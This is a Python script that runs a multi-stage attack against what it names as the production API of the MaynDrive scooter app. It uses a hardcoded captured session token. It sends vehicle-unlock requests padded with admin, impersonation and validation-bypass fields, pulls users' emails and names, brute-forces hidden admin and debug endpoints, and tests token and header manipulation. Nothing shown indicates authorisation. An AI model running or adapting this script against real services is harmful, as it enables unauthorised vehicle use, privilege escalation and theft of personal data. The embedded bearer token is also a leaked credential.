#!/usr/bin/env python3
"""
Deep Vulnerability Analysis for MaynDrive App
Comprehensive security testing based on initial findings
"""

import requests
import json
import time
import re
import base64
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Fresh token from capture
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

def test_json_injection_vulnerability():
    """Deep test of JSON injection vulnerability"""
    print("=" * 80)
    print("[DEEP ANALYSIS] JSON INJECTION VULNERABILITY")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test various JSON injection payloads
    injection_tests = [
        {
            "name": "Admin Privilege Injection",
            "payload": {
                "serial_number": "TUF061",
                "lat": 48.8566,
                "lng": 2.3522,
                "admin": True,
                "force": True,
                "scope": "admin"
            }
        },
        {
            "name": "User ID Manipulation",
            "payload": {
                "serial_number": "TUF061",
                "lat": 48.8566,
                "lng": 2.3522,
                "user_id": 1,  # Try admin user ID
                "session_id": "admin-session"
            }
        },
        {
            "name": "Permission Escalation",
            "payload": {
                "serial_number": "TUF061",
                "lat": 48.8566,
                "lng": 2.3522,
                "permissions": ["admin", "superuser", "root"],
                "role": "admin",
                "level": 999
            }
        },
        {
            "name": "Bypass Validation",
            "payload": {
                "serial_number": "TUF061",
                "lat": 48.8566,
                "lng": 2.3522,
                "bypass_validation": True,
                "skip_checks": True,
                "force_unlock": True
            }
        },
        {
            "name": "Session Hijacking",
            "payload": {
                "serial_number": "TUF061",
                "lat": 48.8566,
                "lng": 2.3522,
                "session_token": "admin-token",
                "impersonate_user": 1
            }
        },
        {
            "name": "API Key Injection",
            "payload": {
                "serial_number": "TUF061",
                "lat": 48.8566,
                "lng": 2.3522,
                "api_key": "admin-key",
                "secret": "admin-secret"
            }
        }
    ]
    
    successful_injections = []
    
    for test in injection_tests:
        print(f"\n[TEST] {test['name']}")
        print(f"   Payload: {json.dumps(test['payload'], indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=test['payload'],
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {test['name']} successful!")
                successful_injections.append(test['name'])
            elif response.status_code == 400:
                print(f"   [BLOCKED] Bad request - injection blocked")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_injections

def test_user_info_exploitation():
    """Deep test of user info endpoint vulnerability"""
    print("\n" + "=" * 80)
    print("[DEEP ANALYSIS] USER INFO EXPLOITATION")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different user info endpoints with various parameters
    user_tests = [
        {
            "name": "Basic User Info",
            "endpoint": "/api/application/users",
            "method": "GET"
        },
        {
            "name": "User Info with Parameters",
            "endpoint": "/api/application/users?include=all",
            "method": "GET"
        },
        {
            "name": "User Info with Admin Flag",
            "endpoint": "/api/application/users?admin=true",
            "method": "GET"
        },
        {
            "name": "User Info with Scope",
            "endpoint": "/api/application/users?scope=admin",
            "method": "GET"
        },
        {
            "name": "User Info POST",
            "endpoint": "/api/application/users",
            "method": "POST",
            "payload": {"include": "all"}
        },
        {
            "name": "User Info with JSON Injection",
            "endpoint": "/api/application/users",
            "method": "POST",
            "payload": {"admin": True, "include": "all"}
        }
    ]
    
    successful_exploits = []
    
    for test in user_tests:
        print(f"\n[TEST] {test['name']}")
        print(f"   Endpoint: {test['endpoint']}")
        print(f"   Method: {test['method']}")
        
        if 'payload' in test:
            print(f"   Payload: {json.dumps(test['payload'], indent=2)}")
        
        try:
            if test['method'] == 'GET':
                response = requests.get(
                    f"{BASE_URL}{test['endpoint']}",
                    headers=headers,
                    timeout=15
                )
            else:
                response = requests.post(
                    f"{BASE_URL}{test['endpoint']}",
                    headers=headers,
                    json=test.get('payload', {}),
                    timeout=15
                )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text[:500]}{'...' if len(response.text) > 500 else ''}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {test['name']} successful!")
                successful_exploits.append(test['name'])
                
                # Try to extract sensitive information
                try:
                    data = response.json()
                    if 'data' in data:
                        user_data = data['data']
                        print(f"   [EXTRACTED] User ID: {user_data.get('user_id', 'N/A')}")
                        print(f"   [EXTRACTED] Email: {user_data.get('email', 'N/A')}")
                        print(f"   [EXTRACTED] Name: {user_data.get('firstname', 'N/A')} {user_data.get('lastname', 'N/A')}")
                        print(f"   [EXTRACTED] Account Type: {user_data.get('is_knot_account', 'N/A')}")
                except:
                    pass
                    
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] Endpoint not found")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_exploits

def test_advanced_endpoint_discovery():
    """Discover and test advanced API endpoints"""
    print("\n" + "=" * 80)
    print("[DEEP ANALYSIS] ADVANCED ENDPOINT DISCOVERY")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Advanced endpoint patterns to test
    advanced_endpoints = [
        # Admin endpoints
        "/api/admin",
        "/api/admin/users",
        "/api/admin/vehicles",
        "/api/admin/sessions",
        "/api/admin/logs",
        "/api/admin/config",
        
        # System endpoints
        "/api/system",
        "/api/system/status",
        "/api/system/config",
        "/api/system/logs",
        "/api/system/health",
        
        # Internal endpoints
        "/api/internal",
        "/api/internal/users",
        "/api/internal/vehicles",
        "/api/internal/sessions",
        
        # Debug endpoints
        "/api/debug",
        "/api/debug/info",
        "/api/debug/config",
        "/api/debug/logs",
        
        # Management endpoints
        "/api/management",
        "/api/management/users",
        "/api/management/vehicles",
        "/api/management/sessions",
        
        # Root endpoints
        "/api/root",
        "/api/root/users",
        "/api/root/vehicles",
        "/api/root/sessions",
        
        # Superuser endpoints
        "/api/super",
        "/api/super/users",
        "/api/super/vehicles",
        "/api/super/sessions",
        
        # Master endpoints
        "/api/master",
        "/api/master/users",
        "/api/master/vehicles",
        "/api/master/sessions",
        
        # Version-specific endpoints
        "/api/v1/admin",
        "/api/v2/admin",
        "/api/v1/internal",
        "/api/v2/internal",
        
        # Special endpoints
        "/api/application/admin",
        "/api/application/internal",
        "/api/application/system",
        "/api/application/debug",
        "/api/application/management",
    ]
    
    successful_endpoints = []
    
    for endpoint in advanced_endpoints:
        print(f"\n[TEST] Endpoint: {endpoint}")
        
        try:
            # Test GET request
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                timeout=15
            )
            
            print(f"   GET Status: {response.status_code}")
            if response.status_code == 200:
                print(f"   [SUCCESS] GET access granted to {endpoint}!")
                successful_endpoints.append(f"{endpoint} (GET)")
                print(f"   Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
            elif response.status_code == 403:
                print(f"   [BLOCKED] GET permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] GET endpoint not found")
            else:
                print(f"   [INFO] GET Status {response.status_code}")
            
            # Test POST request
            response = requests.post(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                json={"test": "payload"},
                timeout=15
            )
            
            print(f"   POST Status: {response.status_code}")
            if response.status_code == 200:
                print(f"   [SUCCESS] POST access granted to {endpoint}!")
                successful_endpoints.append(f"{endpoint} (POST)")
                print(f"   Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
            elif response.status_code == 403:
                print(f"   [BLOCKED] POST permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] POST endpoint not found")
            else:
                print(f"   [INFO] POST Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_endpoints

def test_session_manipulation():
    """Test session manipulation and token reuse vulnerabilities"""
    print("\n" + "=" * 80)
    print("[DEEP ANALYSIS] SESSION MANIPULATION")
    print("=" * 80)
    
    # Test different token variations
    token_tests = [
        {
            "name": "Original Token",
            "token": FRESH_TOKEN
        },
        {
            "name": "Token without Bearer",
            "token": FRESH_TOKEN.replace("Bearer ", "")
        },
        {
            "name": "Token with extra spaces",
            "token": FRESH_TOKEN + " "
        },
        {
            "name": "Token with extra Bearer",
            "token": "Bearer " + FRESH_TOKEN
        },
        {
            "name": "Token with different case",
            "token": FRESH_TOKEN.replace("Bearer", "bearer")
        },
        {
            "name": "Token with different case 2",
            "token": FRESH_TOKEN.replace("Bearer", "BEARER")
        }
    ]
    
    successful_manipulations = []
    
    for test in token_tests:
        print(f"\n[TEST] {test['name']}")
        print(f"   Token: {test['token'][:50]}...")
        
        headers = {
            "Authorization": test['token'],
            "Content-Type": "application/json",
            "User-Agent": "Knot-mayndrive v1.1.34 (android)",
            "Accept": "application/json"
        }
        
        payload = {
            "serial_number": "TUF061",
            "lat": 48.8566,
            "lng": 2.3522
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {test['name']} successful!")
                successful_manipulations.append(test['name'])
            elif response.status_code == 401:
                print(f"   [BLOCKED] Token invalid/expired")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_manipulations

def test_parameter_pollution():
    """Test HTTP parameter pollution vulnerabilities"""
    print("\n" + "=" * 80)
    print("[DEEP ANALYSIS] PARAMETER POLLUTION")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test parameter pollution attacks
    pollution_tests = [
        {
            "name": "Duplicate Authorization Headers",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Authorization": "Bearer admin-token",
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
        },
        {
            "name": "Multiple User-Agent Headers",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "User-Agent": "Admin-Tool v1.0",
                "Accept": "application/json"
            }
        },
        {
            "name": "Mixed Case Headers",
            "headers": {
                "authorization": FRESH_TOKEN,
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
        }
    ]
    
    successful_pollutions = []
    
    for test in pollution_tests:
        print(f"\n[TEST] {test['name']}")
        print(f"   Headers: {json.dumps(test['headers'], indent=2)}")
        
        payload = {
            "serial_number": "TUF061",
            "lat": 48.8566,
            "lng": 2.3522
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=test['headers'],
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {test['name']} successful!")
                successful_pollutions.append(test['name'])
            elif response.status_code == 401:
                print(f"   [BLOCKED] Authentication failed")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_pollutions

def main():
    print("=" * 80)
    print("[DEEP ANALYSIS] COMPREHENSIVE VULNERABILITY ANALYSIS")
    print("=" * 80)
    print("[WARNING] Performing deep security analysis of MaynDrive app!")
    print("=" * 80)
    
    # Run all deep analysis tests
    json_injection_results = test_json_injection_vulnerability()
    user_info_results = test_user_info_exploitation()
    endpoint_discovery_results = test_advanced_endpoint_discovery()
    session_manipulation_results = test_session_manipulation()
    parameter_pollution_results = test_parameter_pollution()
    
    # Summary
    print("\n" + "=" * 80)
    print("[RESULTS] DEEP VULNERABILITY ANALYSIS SUMMARY")
    print("=" * 80)
    
    print(f"\n[JSON INJECTION] Results:")
    if json_injection_results:
        print(f"   [CRITICAL] {len(json_injection_results)} injection vulnerabilities: {json_injection_results}")
    else:
        print(f"   [OK] No JSON injection vulnerabilities found")
    
    print(f"\n[USER INFO EXPLOITATION] Results:")
    if user_info_results:
        print(f"   [HIGH] {len(user_info_results)} user info exploits: {user_info_results}")
    else:
        print(f"   [OK] No user info exploitation vulnerabilities")
    
    print(f"\n[ENDPOINT DISCOVERY] Results:")
    if endpoint_discovery_results:
        print(f"   [CRITICAL] {len(endpoint_discovery_results)} unauthorized endpoints: {endpoint_discovery_results}")
    else:
        print(f"   [OK] No unauthorized endpoint access")
    
    print(f"\n[SESSION MANIPULATION] Results:")
    if session_manipulation_results:
        print(f"   [HIGH] {len(session_manipulation_results)} session manipulations: {session_manipulation_results}")
    else:
        print(f"   [OK] No session manipulation vulnerabilities")
    
    print(f"\n[PARAMETER POLLUTION] Results:")
    if parameter_pollution_results:
        print(f"   [MEDIUM] {len(parameter_pollution_results)} parameter pollution: {parameter_pollution_results}")
    else:
        print(f"   [OK] No parameter pollution vulnerabilities")
    
    # Overall assessment
    total_vulnerabilities = (len(json_injection_results) + len(user_info_results) + 
                           len(endpoint_discovery_results) + len(session_manipulation_results) + 
                           len(parameter_pollution_results))
    
    print(f"\n[OVERALL ASSESSMENT]")
    print(f"   Total vulnerabilities found: {total_vulnerabilities}")
    
    if total_vulnerabilities > 0:
        print(f"   [CRITICAL] Multiple security vulnerabilities detected!")
        print(f"   [WARNING] MaynDrive app has significant security issues!")
    else:
        print(f"   [OK] No additional vulnerabilities found in deep analysis")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
